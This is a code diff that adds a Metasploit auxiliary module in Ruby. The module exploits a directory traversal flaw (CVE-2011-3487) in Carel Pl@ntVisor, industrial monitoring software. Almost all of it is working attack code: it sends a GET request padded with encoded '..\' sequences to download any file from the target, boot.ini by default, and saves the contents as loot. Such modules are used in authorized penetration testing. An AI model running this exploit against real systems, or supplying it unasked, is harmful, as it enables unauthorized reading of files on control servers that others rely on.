@@ -1,0 +1,57 @@
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Carel Pl@ntVisor Directory Traversal',
+			'Description'    => %q{
+				This module exploits a directory traversal vulnerability
+				found in Carel Pl@ntVisor <= 2.4.4. The vulnerability is
+				triggered by sending a specially crafted GET request to the
+				victim server.
+			},
+			'Author'         => [ 'james fitts' ],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'CVE', '2011-3487' ],
+					[ 'BID', '49601' ],
+				],
+			'DisclosureDate' => 'Jun 29 2012'))
+
+		register_options(
+			[
+				OptInt.new('DEPTH', [ false, 'Levels to reach base directory', 10]),
+				OptString.new('FILE', [ false, 'This is the file to download', 'boot.ini']),
+				Opt::RPORT(80)
+			], self.class )
+	end
+
+	def run
+
+	depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+	levels = "/" + ("..%5c" * depth)
+
+	res = send_request_raw({
+		'method'	=> 'GET',
+		'uri'		=> "#{levels}#{datastore['FILE']}",
+	})
+
+	if res and res.code == 200
+		loot = res.body
+		if not loot or loot.empty?
+			print_status("File from #{rhost}:#{rport} is empty...")
+			return
+		end
+		file = ::File.basename(datastore['FILE'])
+		path = store_loot('plantvisor.file', 'application/octet-stream', rhost, loot, file, datastore['FILE'])
+		print_status("Stored #{datastore['FILE']} to #{path}")
+		return
+	end
+
+	end
+end
